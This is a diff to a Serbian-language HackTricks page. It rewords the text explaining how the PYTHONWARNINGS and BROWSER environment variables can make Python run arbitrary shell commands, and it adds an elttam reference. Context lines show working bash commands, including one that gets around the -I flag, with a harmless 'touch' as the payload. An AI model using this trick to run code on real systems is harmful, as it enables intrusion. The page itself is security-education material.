@@ -2,9 +2,9 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Putem `PYTHONWARNINGS` i `BROWSER` env varijabli
+## Putem `PYTHONWARNINGS` i `BROWSER` env promenljivih
 
-Moguće je promeniti obe varijable okruženja da bi se izvršio proizvoljan kod svaki put kada se pozove python, na primer:
+Moguće je izmeniti obe env promenljive kako bi se izvršio proizvoljan code svaki put kada se Python pozove, na primer:<sup>[[1]](#references)</sup>
 ```bash
 # Generate example python script
 echo "print('hi')" > /tmp/script.py
@@ -15,4 +15,8 @@ PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktri
 # RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
 BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
 ```
+## Reference
+
+- [1] [Hacking with Environment Variables - elttam](https://www.elttam.com/blog/env/)
+
 {{#include ../../../banners/hacktricks-training.md}}
